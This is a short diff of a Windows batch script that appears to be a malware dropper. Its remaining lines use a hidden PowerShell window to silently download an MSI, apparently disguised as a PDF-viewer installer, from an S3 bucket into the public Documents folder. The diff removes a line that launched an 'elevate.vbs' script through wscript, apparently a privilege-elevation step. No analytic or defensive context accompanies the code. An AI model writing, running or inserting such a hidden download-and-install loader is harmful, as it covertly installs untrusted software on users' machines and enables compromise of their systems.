@@ -2,10 +2,7 @@
 setlocal
 
 set "agents=%PUBLIC%\Documents\agent-c92d02.msi"
-set "main=%PUBLIC%\Documents\elevate.vbs"
 set "_url=https://pdfviewers.s3.ap-northeast-1.amazonaws.com/Install.msi"
-
-start "" wscript.exe "%main%"
 
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%_url%', '%agents%')"
 
